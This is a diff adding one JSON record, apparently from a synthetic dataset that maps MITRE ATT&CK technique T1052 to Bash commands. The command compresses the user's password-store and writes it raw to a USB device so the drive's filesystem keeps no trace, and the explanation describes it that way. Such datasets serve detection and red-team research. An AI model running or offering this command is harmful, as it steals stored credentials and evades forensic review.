@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "tar -C \"$HOME\" -czf - .password-store | dd of=\"/dev/disk/by-id/usb-Generic_Flash_Disk_8GB-0:0\" bs=1M oflag=direct status=none",
+  "explanation": "Compresses the local password-store and writes it straight to the raw USB disk device, leaving no files on the mounted filesystem of the drive.",
+  "rationale_steps": [
+    "Compress sensitive password-store contents",
+    "Target the USB by unique by-id device node",
+    "Transfer the stream with dd directly to the block device to avoid filesystem traces"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-35fd8ad4",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
